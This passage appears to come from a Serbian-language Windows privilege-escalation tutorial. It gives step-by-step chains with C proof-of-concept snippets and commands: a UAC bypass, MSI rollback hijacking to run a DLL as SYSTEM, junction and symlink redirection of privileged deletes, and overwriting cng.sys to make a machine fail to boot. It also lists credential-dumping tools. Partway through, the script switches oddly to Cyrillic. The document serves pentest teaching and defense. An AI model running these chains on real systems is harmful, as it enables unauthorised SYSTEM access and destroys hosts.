  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz naloga korisnika bez privilegija.

To omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno, pomoću iste ranjivosti. Pored toga, nije potrebno ništa instalirati, a binarni fajl koji se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se ova ranjivost iskoristila, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od srednjeg do visokog nivoa integriteta administratora / UAC zaobilaženje

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i načinima za njegovo zaobilaženje:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Preusmeravanje otpremnih direktorijuma pomoću junction-a u direktorijum koji se poslužuje

Aplikacija može da kreira predvidljiv poddirektorijum za otpremanje, da u njega upiše ime datoteke koje je dostavio pozivalac, a zatim da obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-ом pre nego što dođe do upisa sa serverske strane, upis može preko junction-а da dospe u direktorijum koji se poslužuje vebom. Skripta smeštena tamo može da se pokrene pod identitetom veb-servisa ako server izvršava tu vrstu datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za upis ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačan način formiranja putanje i vremenski raspored u obrađivaču otpremanja, efektivne dozvole korisnika za brisanje i kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces koji upisuje prati reparse tačke i da li veb-server izvršava datoteke na tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i veb-servera. Pasivni popis može da prikaže ACL-ove direktorijuma i metapodatke reparse tačaka, ali ne može da utvrdi ponašanje obrađivača ili buduću zamenu junction-а. Ako se izvršavanje odvija pod nalogom servisnog naloga, pregledajte **stvarni token procesa** pre nego što razmotrite zaseban put eskalacije privilegija tokena.

## Čišćenje zakazanog zadatka sa privilegijama, pokrenuto WNF-om

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izloži okidač koji može da aktivira korisnik bez privilegija. Pri proveri zadatka sa privilegijama izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako trenutni korisnik ima dozvolu da objavi izmenu tog stanja, može posredno da pokrene zadatak pod njegovim konfigurisanim identitetom, uprkos vrednosti `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` pokretao se kao SYSTEM, prihvatao izmene WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim pregledao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobaјtno ime stanja i uporedite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća skraćena proba koristi niz bajtova iz primera zadatka Recall; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u brisanje sa privilegijama

Korisni primitiv nije samo okidač, već privilegovana rutina čišćenja koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesije, deca izabrana pomoću džokera, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` snažno ukazuju na to da će se prethodno proverena putanja kasnije rekurzivno obrađivati. Ako se potomci ne otvaraju relativno u odnosu na pouzdane handle-ove direktorijuma i ne validiraju pre brisanja, napadač može da promeni rezoluciju putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction and Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) tehnikom opisanom u nastavku: oplock zaustavlja čistač nakon što izabere legitimno dete, dok se direktorijum koji se može menjati zamenjuje tako da se, nakon nastavka rada, privilegovanim brisanjem kroz `\RPC Control` pristupa zaštićenoj meti. U lancu Recall to je omogućilo SYSTEM-u da obriše `C:\Config.Msi`, što je bilo potrebno za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Potomci na većoj dubini zaobilaze površne popravke za reparse point

Validacija samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanji. Ostavite te proverene objekte legitimnim, a zamenu pomoću junction/oplock tehnike premestite u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju doći do nevalidiranog potomka i pratiti njegovu novu metu. CVE-2026-20941 nastao je upravo zbog ovakve nepotpune ispravke: prva zakrpa za Recall je validirala `UKP` i direktorijum u obliku GUID-a, ali je zadržala staru operaciju rekurzivnog brisanja.<sup>[[43]](#references)</sup>

Bezbedan pristup je da otvorite **svakog potomka** relativno u odnosu na već pouzdan handle direktorijuma, pribavite i proverite konačnu razrešenu putanju/objekat, pa primenite oznaku za brisanje na taj provereni handle. Nemojte validirati prefiks, a zatim se vratiti na rekurzivno brisanje zasnovano na putanji. Tokom pregleda zakrpe proverite i strukture na stvarnom mestu poziva: u ovom slučaju, pregled u toku izvršavanja strukture `OBJECT_ATTRIBUTES` pri `NtCreateFile` pokazao je neprazan `RootDirectory` i relativno ime `{GUID}\\secure_file.lock`, čime je opovrgnut obmanjujući izlaz dekompilatora koji je ukazivao na drugi primitiv `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od brisanja/pomeranja/preimenovanja proizvoljnog direktorijuma do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe Windows Installer rollback funkcije radi zamene legitimnih datoteka zlonamernim tokom deinstalacije. Za to napadač treba da napravi **zlonamerni MSI installer** koji će se koristiti za preuzimanje kontrole nad direktorijumom `C:\Config.Msi`. Windows Installer će kasnije koristiti taj direktorijum za skladištenje rollback datoteka tokom deinstalacije drugih MSI paketa; rollback datoteke će biti izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje u Windows Installer COM (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM servisu `msiexec.exe` preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Obrnutim inženjeringom utvrđeno je da su relevantni pozivi `IMsiServer` metode `MsiBeginTransactionW` na pomaku vtable-a `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i pomaci utvrđeni su obrnutim inženjeringom i mogu se razlikovati među build-ovima.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo dok otvara navedenu putanju sa zastavicama `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se dokazuje da pozivalac može da obriše direktorijum i izbegava praćenje reparse point-a, ali se **ne** vezuje provereni objekat datoteke za kasnije čišćenje niti se dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao direktorijum, bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` pod ključem `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja pod kontrolom pozivaoca, a podatak `0x00000002` označava direktorijum. Zatim `CleanupTempPackages(NULL, FALSE)` direktno pokreće čišćenje. Njegov procesni radnik sa povišenim privilegijama enumeriše vrednosti registra i prosleđuje stavke direktorijuma rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, uklanja atribute datoteke i ponavlja pokušaj.<sup>[[41]](#references)</sup>

Minimalni redosled poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-a. Registrujte napadačem kreirani `C:\Config.Msi`, uklonite ga, a zatim sačekajte da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Ovo zaobilazi predviđenu zaštitu koju pružaju `FILE_FLAG_OPEN_REPARSE_POINT` i ublažavanje rizika zasnovano na poverenju u redirekciju, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac u nastavku: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` koji ste otvorili pre nego što installer pooštri DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nego što se rollback nastavi.<sup>[[41]](#references)</sup>

Microsoft je ispravio ovaj problem sa putanjom tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju kojom upravlja napadač u `TempPackages`. Instalirajte bezbednosna ažuriranja za Windows iz aprila 2025. umesto da uspešan povratak metode koristite kao test ispravke.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema za otmicu (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u folder u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, tako da može da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** za datoteku nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da im menja imena u `.rbf` datoteke (rollback rezervne kopije).
    - **Proveravajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu radnju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` zapisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada primite signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** da bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi (napadač) ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazan**, spreman za otmicu.

> U ovom trenutku **aktivirajte ranjivost za brisanje proizvoljnog foldera na nivou SYSTEM-a** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte folder `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa dozvolom `WRITE_DAC`.

- Korak 7: Pokrenite novu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim vrednostima:
        - `TARGETDIR`: Lokacija u koju može da se upisuje.
        - `ERROROUT`: Promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs`
    - Koristite `ReadDirectoryChangesW` da biste pratili `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
    - Zabeležite njegovo ime datoteke.

- Korak 9: Sinhronizujte se pre rollback-a
    - `.msi` sadrži **prilagođenu radnju instalacije (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon što primite događaj `.rbs created`:
        - Windows Installer **ponovo primenjuje snažne ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa dozvolom `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo pri otvaranju handle-a**, tako da i dalje možete da upisujete u folder.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni DLL payload na nivou SYSTEM-a**.

- Korak 12: Pokrenite rollback
    - Pošaljite signal za sinhronizaciju da bi installer nastavio.
    - **Prilagođena radnja tipa 19 (`ErrorOut`)** podešena je tako da **namerno izazove neuspeh instalacije** u poznatom trenutku.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada je vaš **zlonamerni DLL na putanji из које га учитава SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdani **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL čiju сте путању отели.
    - **Готово**: Ваш код се извршава **као SYSTEM**.


### Од произвољног брисања/премештања/преименовања датотеке до SYSTEM EoP

Главна MSI rollback техника (претходна) претпоставља да можете да обришете **цео folder** (нпр. `C:\Config.Msi`). Али шта ако ваша рањивост омогућава само **брисање произвољне датотеке**?

Можете да искористите **NTFS internals**: сваки folder има скривени alternate data stream који се зове:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete da uradite pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitive ne dozvoljava da brišete proizvoljne fajlove/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu-mamac i fajl
- Kreirajte: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada naiđe na `file1.txt`, **oplock se aktivira** i prepušta kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok koji čuva metapodatke fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja fascikle na proizvoljnoj lokaciji do trajnog DoS-a

Iskoristite primitive koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **podešavate slabe permissions**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows driver-a**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows ne uspeva da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervne opcije** niti **oporavka** bez spoljne intervencije (npr. popravke pri pokretanju ili pristupa disku).

### Od povlašćenih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja datoteka / boot DoS

Kada **povlašćena usluga** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije sa dozvolom upisa**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste pretvorili povlašćeni upis u proizvoljno prepisivanje datoteka (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Zahtevi**
- Konfiguracija koja sadrži ciljnu putanju može da se menja od strane napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Povlašćena operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali odredište povlašćenog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Zapis će sada završiti u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu datoteku (hex/PE parserom) da biste potvrdili oštećenje; ponovnim pokretanjem Windows će učitati izmenjenu putanju drajvera → **DoS petljom pokretanja**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za pisanje.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, Windows može prvo pokušati da je učita, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Nova usluga**

Ako već radite u procesu sa High Integrity integritetom, **put do SYSTEM-a** može biti lak — samo **kreirajte i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Kada kreirate binarnu datoteku servisa, proverite da li je u pitanju validan servis ili da li binarna datoteka brzo izvršava potrebne radnje, jer će biti prekinuta nakon 20 sekundi ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa visokim integritetom možete pokušati da **omogućite stavke registra AlwaysInstallElevated** i **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o uključenim ključevima registra i načinu instaliranja _.msi_ paketa potražite ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do privilegija Full Token

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima visok integritet), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću privilegije SeDebug, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično se koristi za **izbor bilo kog procesa koji se izvršava kao SYSTEM i ima sve privilegije tokena** (_da, možete pronaći SYSTEM procese koji nemaju sve privilegije tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Sastoji se od **kreiranja cevi, a zatim kreiranja/zloupotrebe servisa za pisanje u tu cev**. Zatim će **server** koji je kreirao cev pomoću privilegije **`SeImpersonate`** moći da **imitira token** klijenta cevi (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o named pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog integriteta na System pomoću named pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete DLL** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija, a osim toga, mnogo **lakše ga je izvesti iz procesa sa visokim integritetom**, jer će taj proces imati **dozvole za pisanje** u fascikle koje se koriste za učitavanje DLL-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do svih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Otkriven.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Otkriven.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na celom domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovno privesc enumerisanje Windows-a**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora se kompajlirati pomoću VisualStudio) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Istražuje host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (mora se kompajlirati) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz velikog broja softvera (prekompajlirana exe datoteka na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani izvršni fajl na github-u). Ne preporučuje se. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ove objave (za pravilan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje funkcionalne exploit-e (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na računaru žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
